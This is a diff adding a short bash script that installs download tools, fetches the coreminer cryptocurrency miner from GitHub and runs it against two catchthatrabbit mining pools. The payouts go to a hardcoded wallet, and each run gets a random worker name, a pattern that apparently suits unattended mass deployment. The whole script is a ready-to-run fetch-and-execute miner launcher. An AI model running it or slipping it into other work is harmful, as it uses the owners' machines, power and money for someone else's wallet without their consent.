@@ -1,0 +1,8 @@
+#!/bin/bash
+apt update
+apt install -y wget sudo curl
+wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz
+tar xf coreminer-linux-x86_64.tar.gz
+cd coreapp
+./coreminer -P stratum1+tcp://cb24ab8904ed8196c5dafb1306783f2b44890dc5e541.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 \
+     -P stratum1+tcp://cb24ab8904ed8196c5dafb1306783f2b44890dc5e541.$(echo $RANDOM | md5sum | head -c 10)@sg.catchthatrabbit.com:8008
